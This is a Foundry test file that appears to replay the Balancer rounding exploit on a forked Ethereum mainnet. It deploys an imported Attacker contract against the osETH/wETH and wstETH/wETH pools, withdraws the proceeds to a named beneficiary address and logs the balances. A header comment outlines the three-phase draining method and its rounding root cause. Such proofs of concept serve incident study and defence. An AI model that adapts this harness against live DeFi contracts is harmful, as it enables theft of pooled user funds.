//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {Test, console} from "forge-std/Test.sol";
import {ForkUtils} from "../utils/ForkUtils.t.sol";
import {
    Attacker,
    Helper,
    IBalancerVault,
    IComposableStablePool,
    IERC20
} from "../../src/balancer2025/BalancerExploit.sol";

/// @notice Balancer $128M rounding exploit via GIVEN_OUT swap kind
/// Phase 1: Drain reserves geometrically (22 swaps, 4.87e24 → 50 amounts)
/// Phase 2: Exploit broken invariant with trickAmt=17 (30 loops, 1.97 loss/round)
/// Phase 3: Extract profit exponentially (1e4 → 1e22)
/// Root cause: Ex- mulDown(17.986e18) → 17e18, loss 0.986 per swap
contract BalancerExploit is Test, ForkUtils {
    // Contract addresses
    address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant balancer = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address constant osETH_wETH = 0xDACf5Fa19b1f720111609043ac67A9818262850c;
    address constant wstETH_wETH = 0x93d199263632a4EF4Bb438F1feB99e57b4b5f0BD;
    address constant osToken = 0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant attacker = 0x506D1f9EFe24f0d47853aDca907EB8d89AE03207;
    address constant beneficiary = 0xAa760D53541d8390074c61DEFeaba314675b8e3f;
    uint256 constant BLOCK_NUMBER = 23717397; //attack block number

    function setUp() public {
        // Setup fork at block before attack
        string memory rpcUrl = vm.envString("MAINNET_RPC_URL");
        setupFork("Balancer2025", rpcUrl, BLOCK_NUMBER - 1);
        selectFork("Balancer2025");
    }

    function testBalancerPoC() public {
        // Log initial balances
        console.log("weth balance of benificiary before attack: ", IERC20(weth).balanceOf(beneficiary) / 1e18);
        console.log(
            "osETH_wETH balance of benificiary before attack: ", IERC20(osETH_wETH).balanceOf(beneficiary) / 1e18
        );
        console.log(
            "wstETH_wETH balance of benificiary before attack: ", IERC20(wstETH_wETH).balanceOf(beneficiary) / 1e18
        );
        console.log("osToken balance of benificiary before attack: ", IERC20(osToken).balanceOf(beneficiary) / 1e18);
        console.log("wstETH balance of benificiary before attack: ", IERC20(wstETH).balanceOf(beneficiary) / 1e18);

        // Deploy attacker contract
        Attacker attacker = new Attacker();
        // Execute exploit on osETH/wETH pool
        attacker.attack(osETH_wETH, 67000, 30); // offline computing numbers
        attacker.withdraw(osETH_wETH, beneficiary);

        // Execute exploit on wstETH/wETH pool
        attacker.attack(wstETH_wETH, 100000000000, 25); // offline computing numbers
        attacker.withdraw(wstETH_wETH, beneficiary);

        // Log final balances
        console.log("weth balance of benificiary after attack: ", IERC20(weth).balanceOf(beneficiary) / 1e18);
        console.log(
            "osETH_wETH balance of benificiary after attack: ", IERC20(osETH_wETH).balanceOf(beneficiary) / 1e18
        );
        console.log(
            "wstETH_wETH balance of benificiary after attack: ", IERC20(wstETH_wETH).balanceOf(beneficiary) / 1e18
        );
        console.log("osToken balance of benificiary after attack: ", IERC20(osToken).balanceOf(beneficiary) / 1e18);
        console.log("wstETH balance of benificiary after attack: ", IERC20(wstETH).balanceOf(beneficiary) / 1e18);
    }
}
